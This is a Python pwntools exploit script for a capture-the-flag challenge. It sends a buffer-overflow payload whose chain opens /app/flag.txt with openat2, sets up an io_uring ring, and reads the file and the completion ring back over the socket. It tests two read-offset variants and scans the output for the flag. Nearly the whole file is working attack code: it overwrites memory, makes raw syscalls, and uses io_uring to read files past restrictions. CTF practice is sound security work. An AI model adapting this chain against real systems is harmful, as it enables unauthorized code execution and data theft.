#!/usr/bin/env python3
"""Capture the io_uring file-READ completion res, trying offset variants.

Leak proved: ring offsets are correct remote, WRITE works, but the flag READ
posts no CQE / no data. Here we run READ with different sqe.off values and, for
each, leak the CQ ring (scan for the READ's user_data=0x1111 and read its res)
plus FILEBUF. res tells us bytes-read or -errno; off=-1 = "use file position".

Run:  uv run python leak_read.py [host] [port]
"""
import os
import re
import struct
import sys

from pwn import context, remote

context.arch = "amd64"
context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267

NEG1 = 0xFFFFFFFFFFFFFFFF


def enter_idx(ring_fd, idx):
    c = S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, 0)
    c += S.setmem64(S.RINGS + 0, ((idx + 1) << 32) | idx)
    c += S.wsyscall(S.SYS_IO_URING_ENTER, ring_fd, 1, 1, S.IORING_ENTER_GETEVENTS)
    return c


def shoot(chain):
    payload = b"A" * S.OFF + chain
    assert b"\n" not in payload, "payload has newline"
    io = remote(HOST, PORT, timeout=8)
    io.sendline(payload)
    d = io.recvall(timeout=8) or b""
    try:
        io.close()
    except Exception:
        pass
    return d


def run_variant(off_val, length, label):
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)       # fd 3
    c += S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)            # ring 4
    c += S.build_sqe(S.IORING_OP_READ, 3, S.FILEBUF, length, off_val, 0x1111)
    c += enter_idx(4, 0)
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.RINGS, 0x200, 0, 0x3333)   # leak CQ (READ cqe)
    c += enter_idx(4, 1)
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.FILEBUF, length, 0, 0x4444)  # leak buffer
    c += enter_idx(4, 2)
    c += S.wsyscall(231, 0)
    d = shoot(c)

    rings = d[:0x200]
    filebuf = d[0x200:0x200 + length]
    # scan CQ region for the READ's user_data (0x1111) and pull res after it
    res = None
    needle = struct.pack("<Q", 0x1111)
    i = rings.find(needle)
    if i != -1 and i + 12 <= len(rings):
        res = struct.unpack_from("<i", rings, i + 8)[0]
    # sq_dropped @ ring+32, cq_tail @ ring+12
    sq_dropped = struct.unpack_from("<I", rings, 32)[0] if len(rings) >= 36 else None
    cq_tail = struct.unpack_from("<I", rings, 12)[0] if len(rings) >= 16 else None
    human = "no READ cqe found" if res is None else (f"{res} bytes" if res >= 0 else f"errno {-res}")
    flag = re.search(rb"grey\{[^}]*\}", filebuf)
    print(f"[{label}] READ res={res} ({human})  sq_dropped={sq_dropped} cq_tail={cq_tail}  "
          f"filebuf[:32]={filebuf[:32]!r}")
    if flag:
        print(f"    [+] FLAG: {flag.group(0).decode()}")
        return flag.group(0).decode()
    return None


def main():
    print(f"=== {HOST}:{PORT} ===")
    for off_val, label in [(0, "off=0"), (NEG1, "off=-1(curpos)")]:
        f = run_variant(off_val, 0x80, label)
        if f:
            return 0
    print("[i] if both errno: read primitive blocked; if res>0 but zeros: buffer/addr issue")
    return 1


if __name__ == "__main__":
    sys.exit(main())
